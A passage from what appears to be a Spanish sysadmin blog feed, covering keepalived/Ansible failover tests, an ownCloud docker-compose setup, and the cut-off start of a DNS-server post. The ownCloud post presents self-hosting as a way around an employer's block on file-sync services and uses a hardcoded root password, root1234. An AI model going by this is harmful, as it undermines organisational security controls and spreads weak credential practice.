&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;pollux&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/webserver# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Keepalived, o como compartir una dirección IP&lt;/h2&gt;
&lt;p&gt;Ante nada, nos movemos a la carpeta de trabajo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/webserver# &lt;span class="nb"&gt;cd&lt;/span&gt; ~/playbooks/keepalived/
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Realmente, el servicio &lt;strong&gt;keepalived&lt;/strong&gt; es como cualquier otro: instalar, configurar y recargar la configuración. Lo importante en este caso son las configuraciones. Así que el &lt;em&gt;playbook&lt;/em&gt; queda un poco simple, pero mejor. Solo cabe destacar que he instalado también &lt;strong&gt;rsyslog&lt;/strong&gt; que me va a proporcionar capacidades de &lt;em&gt;syslog&lt;/em&gt;, que es donde &lt;strong&gt;keepalived&lt;/strong&gt; deja lo &lt;em&gt;logs&lt;/em&gt;. Gracias este &lt;em&gt;log&lt;/em&gt;, pude ver que hacía una operación no permitida para un contenedor normal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# cat keepalived.yml 
- hosts: gemini
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;rsyslog &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;rsyslog &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
- hosts: gemini
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;keepalived &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;keepalived.conf.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/keepalived/keepalived.conf
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;keepalived &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;restarted
root@gemini:~/playbooks/keepalived# cat keepalived.conf.j2 
vrrp_script chk_nginx &lt;span class="o"&gt;{&lt;/span&gt;
      script &lt;span class="s2"&gt;&amp;quot;killall -0 nginx&amp;quot;&lt;/span&gt;
      interval &lt;span class="m"&gt;2&lt;/span&gt;
      weight &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

vrrp_instance VI_1 &lt;span class="o"&gt;{&lt;/span&gt;
      interface eth0
      state MASTER
      virtual_router_id &lt;span class="m"&gt;51&lt;/span&gt;
      priority &lt;span class="o"&gt;{{&lt;/span&gt; keepalived_priority &lt;span class="o"&gt;}}&lt;/span&gt;
      virtual_ipaddress &lt;span class="o"&gt;{&lt;/span&gt;
           &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10
      &lt;span class="o"&gt;}&lt;/span&gt;
      track_script &lt;span class="o"&gt;{&lt;/span&gt;
           chk_nginx
      &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que cada máquina del &lt;em&gt;cluster&lt;/em&gt; tiene una prioridad, y la máquina con mas prioridad va a obtener la IP flotante, dando el servicio efectivo. Esta prioridad se ve afectada por los &lt;em&gt;checks&lt;/em&gt; que pongamos, sumando el &lt;em&gt;weight&lt;/em&gt; de cada &lt;em&gt;check&lt;/em&gt; que devuelva un código de retorno 0 (se considera un OK).&lt;/p&gt;
&lt;p&gt;Con los valores 101 y 100 (que salen del fichero de &lt;em&gt;hosts&lt;/em&gt;) y el propio funcionamiento de &lt;strong&gt;keepalived&lt;/strong&gt;, nos aseguramos de que:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Si una máquina está caída no es candidata a tener la IP flotante (las dos caídas son un tema serio).&lt;/li&gt;
&lt;li&gt;Si &lt;em&gt;castor&lt;/em&gt; tiene el &lt;strong&gt;nginx&lt;/strong&gt; funcional, suma 103, y gana a &lt;em&gt;pollux&lt;/em&gt; (102 o 100, dependiendo si corre o no el &lt;strong&gt;nginx&lt;/strong&gt;).&lt;/li&gt;
&lt;li&gt;Si el &lt;strong&gt;nginx&lt;/strong&gt; de &lt;em&gt;castor&lt;/em&gt; no funciona, depende; si el de &lt;em&gt;pollux funciona, pasa este a ser el &lt;/em&gt;MASTER&lt;em&gt; del &lt;/em&gt;cluster&lt;em&gt; (101 vs 102); sino, gana &lt;/em&gt;castor* (101 vs 100), aunque este caso también es un problema.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lanzamos el &lt;em&gt;playbook&lt;/em&gt; para instalar &lt;strong&gt;keepalived&lt;/strong&gt; y su configuración:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible-playbook keepalived.yml 

PLAY &lt;span class="o"&gt;[&lt;/span&gt;gemini&lt;span class="o"&gt;]&lt;/span&gt; ******************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;gemini&lt;span class="o"&gt;]&lt;/span&gt; ******************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;template&lt;span class="o"&gt;]&lt;/span&gt; ****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
castor                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
pollux                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda observar quien tiene la IP flotante (es &lt;em&gt;castor&lt;/em&gt; porque ambos &lt;strong&gt;nginx&lt;/strong&gt; funcionan y es un 103 vs 102).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m raw -a &lt;span class="s1"&gt;&amp;#39;ip addr | grep &amp;quot;inet &amp;quot;&amp;#39;&lt;/span&gt; gemini
castor &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.3/16 scope global eth0
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10/32 scope global eth0


pollux &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.4/16 scope global eth0


root@gemini:~/playbooks/keepalived# wget -qO- http://172.18.0.10/
&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;castor&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de alta disponibilidad&lt;/h2&gt;
&lt;p&gt;Vamos a simular una caída de &lt;em&gt;castor&lt;/em&gt; o de su &lt;strong&gt;nginx&lt;/strong&gt; (el resultado es el mismo):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m service -a &lt;span class="s2"&gt;&amp;quot;name=nginx state=stopped&amp;quot;&lt;/span&gt; castor
castor &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: true, 
    &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;nginx&amp;quot;&lt;/span&gt;, 
    &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;stopped&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;¿Que pasa con la IP flotante? Por supuesto, la hereda &lt;em&gt;pollux&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m raw -a &lt;span class="s1"&gt;&amp;#39;ip addr | grep &amp;quot;inet &amp;quot;&amp;#39;&lt;/span&gt; gemini
castor &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.3/16 scope global eth0


pollux &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;


    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.4/16 scope global eth0
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10/32 scope global eth0


root@gemini:~/playbooks/keepalived# wget -qO- http://172.18.0.10/
&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;pollux&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora simularemos que se cae &lt;em&gt;pollux&lt;/em&gt;. Esto nos deja sin servicio...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m service -a &lt;span class="s2"&gt;&amp;quot;name=nginx state=stopped&amp;quot;&lt;/span&gt; pollux
pollux &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: true, 
    &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;nginx&amp;quot;&lt;/span&gt;, 
    &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;stopped&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como las dos máquinas están levantadas, se trata de un 101 vs 100, lo que le da la IP a &lt;em&gt;castor&lt;/em&gt;. El servicio no responde porque el &lt;strong&gt;nginx&lt;/strong&gt; de &lt;em&gt;castor&lt;/em&gt; está caído. Mal asunto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m raw -a &lt;span class="s1"&gt;&amp;#39;ip addr | grep &amp;quot;inet &amp;quot;&amp;#39;&lt;/span&gt; gemini
pollux &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.4/16 scope global eth0


castor &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.3/16 scope global eth0
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10/32 scope global eth0


root@gemini:~/playbooks/keepalived# wget -O- http://172.18.0.10/
converted &lt;span class="s1"&gt;&amp;#39;http://172.18.0.10/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ANSI_X3.4-1968&lt;span class="o"&gt;)&lt;/span&gt; -&amp;gt; &lt;span class="s1"&gt;&amp;#39;http://172.18.0.10/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;UTF-8&lt;span class="o"&gt;)&lt;/span&gt;
--2016-10-14 &lt;span class="m"&gt;11&lt;/span&gt;:00:08--  http://172.18.0.10/
Connecting to &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10:80... failed: Connection refused.
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora, supongamos que &lt;em&gt;pollux&lt;/em&gt; se recupera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m service -a &lt;span class="s2"&gt;&amp;quot;name=nginx state=started&amp;quot;&lt;/span&gt; pollux
pollux &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: true, 
    &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;nginx&amp;quot;&lt;/span&gt;, 
    &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;started&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin sorpresas, asume la IP flotante (101 vs 102).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m raw -a &lt;span class="s1"&gt;&amp;#39;ip addr | grep &amp;quot;inet &amp;quot;&amp;#39;&lt;/span&gt; gemini
pollux &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.4/16 scope global eth0
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10/32 scope global eth0


castor &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.3/16 scope global eth0


root@gemini:~/playbooks/keepalived# wget -qO- http://172.18.0.10/
&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;pollux&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente se recupera &lt;em&gt;castor&lt;/em&gt;, lo que le da la prioridad para asumir su posición como &lt;em&gt;master&lt;/em&gt; del &lt;em&gt;cluster&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m service -a &lt;span class="s2"&gt;&amp;quot;name=nginx state=started&amp;quot;&lt;/span&gt; castor
castor &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: true, 
    &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;nginx&amp;quot;&lt;/span&gt;, 
    &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;started&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y sin sorpresas, recibe las peticiones para sí mismo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/keepalived# ansible -m raw -a &lt;span class="s1"&gt;&amp;#39;ip addr | grep &amp;quot;inet &amp;quot;&amp;#39;&lt;/span&gt; gemini
castor &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.3/16 scope global eth0
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.10/32 scope global eth0


pollux &lt;span class="p"&gt;|&lt;/span&gt; SUCCESS &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;rc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &amp;gt;&amp;gt;

    inet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1/8 scope host lo
    inet &lt;span class="m"&gt;172&lt;/span&gt;.18.0.4/16 scope global eth0


root@gemini:~/playbooks/keepalived# wget -qO- http://172.18.0.10/
&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;castor&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/keepalived# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de haberse levantado antes &lt;em&gt;castor&lt;/em&gt;, habría ejercido como &lt;em&gt;master&lt;/em&gt; enseguida, y el levantamiento de &lt;em&gt;pollux&lt;/em&gt; no habría provocado un &lt;em&gt;failover&lt;/em&gt; nuevo (103 vs 100 y 103 vs 102, respectivamente).&lt;/p&gt;
&lt;p&gt;Y con esto ya podemos tener nuestros servicios y balanceadores tipo "ventanilla única" redundados y con alta disponibilidad. Cabe indicar que esto no es útil ni con los &lt;em&gt;backends&lt;/em&gt; (el balanceador ya suele controlar si una de ellos está caído o no), ni con los &lt;em&gt;clusters&lt;/em&gt; con tecnología de &lt;em&gt;clustering&lt;/em&gt; propia (bases de datos, colas, ...).&lt;/p&gt;</content><category term="keepalived"></category><category term="failover"></category><category term="ansible"></category><category term="ip flotante"></category></entry><entry><title>Sincronizando ficheros con ownCloud</title><link href="http://www.linuxsysadmin.ml/2017/02/sincronizando-ficheros-con-owncloud.html" rel="alternate"></link><published>2017-02-20T10:00:00+01:00</published><updated>2017-02-20T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-02-20:/2017/02/sincronizando-ficheros-con-owncloud.html</id><summary type="html">&lt;p&gt;Finalmente ha sucedido: el ingeniero de seguridad de la empresa ha decidido cerrar servicios de sincronizado de ficheros, dejando inútiles servicios como &lt;strong&gt;Dropbox&lt;/strong&gt;, &lt;strong&gt;Mega&lt;/strong&gt; y otros. Sin embargo, cualquier bloqueo que se haga mediante el dominio hace que sea imposible cerrar todos estos servicios, e incluso podemos poner el nuestro …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Finalmente ha sucedido: el ingeniero de seguridad de la empresa ha decidido cerrar servicios de sincronizado de ficheros, dejando inútiles servicios como &lt;strong&gt;Dropbox&lt;/strong&gt;, &lt;strong&gt;Mega&lt;/strong&gt; y otros. Sin embargo, cualquier bloqueo que se haga mediante el dominio hace que sea imposible cerrar todos estos servicios, e incluso podemos poner el nuestro.&lt;/p&gt;
&lt;p&gt;La forma mas simple de tener un servicio privado es utilizar algo que ya esté hecho, y en esta categoría tenemos un contendiente ganador: &lt;a href="https://owncloud.org/"&gt;ownCloud&lt;/a&gt;. Solo sería necesario alojarlo en algún lugar desde donde todos nuestros dispositivos tengan acceso.&lt;/p&gt;
&lt;p&gt;Vamos a tirar de &lt;strong&gt;Docker&lt;/strong&gt; y de &lt;strong&gt;DockerHub&lt;/strong&gt;, concretamente de la imagen oficial, que podemos encontrar &lt;a href="https://hub.docker.com/_/owncloud/"&gt;aquí&lt;/a&gt;. Como necesitamos una base de datos, vamos a utilizar &lt;strong&gt;docker-compose&lt;/strong&gt; para levantar fácilmente ambas, usando también la imagen oficial de &lt;strong&gt;MariaDB&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Así nos queda el &lt;em&gt;docker-compose.yml&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/owncloud$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;

services:
  owncloud:
    image: owncloud
    container_name: owncloud
    hostname: owncloud
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:80&amp;quot;&lt;/span&gt;
  mysql:
    image: mariadb
    container_name: mysql
    hostname: mysql
    environment:
      MYSQL_ROOT_PASSWORD: root1234
gerard@sirius:~/docker/owncloud$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos el servicio con los comandos habituales:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/owncloud$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;owncloud_default&amp;quot;&lt;/span&gt; with the default driver
Creating owncloud
Creating mysql
gerard@sirius:~/docker/owncloud$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solamente nos queda acceder al puerto expuesto, desde un navegador cualquiera, usando la URL que corresponda. En mi caso, accedo desde la máquina local, que es donde he levantado ambos contenedores; simplemente usamos &lt;a href="http://localhost/"&gt;http://localhost/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Owncloud setup" src="http://www.linuxsysadmin.ml/images/owncloud_setup.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Vemos que la primera vez que accedemos nos pide configurar algunas cosas. Rellenamos los campos con los valores mas apropiados, con un usuario de administrador y su contraseña, y los datos de conexión de la base de datos, con cuidado de elegir &lt;strong&gt;mysql&lt;/strong&gt;. Usad los valores del &lt;em&gt;docker-compose.yml&lt;/em&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Database user&lt;/strong&gt;: root&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Database password&lt;/strong&gt;: root1234&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Database name&lt;/strong&gt;: owncloud (cualquiera valdría)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Database host&lt;/strong&gt;: mysql (el &lt;em&gt;container_name&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Si le damos a "Finalizar", no hay mas pasos a seguir; finalmente ya lo tenemos funcional.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Owncloud setup" src="http://www.linuxsysadmin.ml/images/owncloud_panel.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Ahora podemos descargarnos cualquier cliente para sincronizar nuestros datos desde cualquier dispositivo, sea para escritorio, &lt;em&gt;android&lt;/em&gt; o &lt;em&gt;iphone&lt;/em&gt;. Solamente necesitamos la precaución de crear usuarios para garantizar la privacidad entre todos ellos.&lt;/p&gt;</content><category term="owncloud"></category><category term="docker"></category><category term="docker-compose"></category></entry><entry><title>Escribiendo un servidor DNS en python con twisted</title><link href="http://www.linuxsysadmin.ml/2017/02/escribiendo-un-servidor-dns-en-python-con-twisted.html" rel="alternate"></link><published>2017-02-13T00:00:00+01:00</published><updated>2017-02-13T00:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-02-13:/2017/02/escribiendo-un-servidor-dns-en-python-con-twisted.html</id><summary type="html">&lt;p&gt;El otro día tuvimos una caída del centro de datos de desarrollo. Inmediatamente después vimos que teníamos afectación en el entorno de producción, ya que lanzaba peticiones al &lt;strong&gt;DNS&lt;/strong&gt; de desarrollo. Sin saber claramente porque pasaba, hice un servidor &lt;strong&gt;DNS&lt;/strong&gt; en &lt;strong&gt;python&lt;/strong&gt;, para ver que tipos de peticiones se lanzaban …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día tuvimos una caída del centro de datos de desarrollo. Inmediatamente después vimos que teníamos afectación en el entorno de producción, ya que lanzaba peticiones al 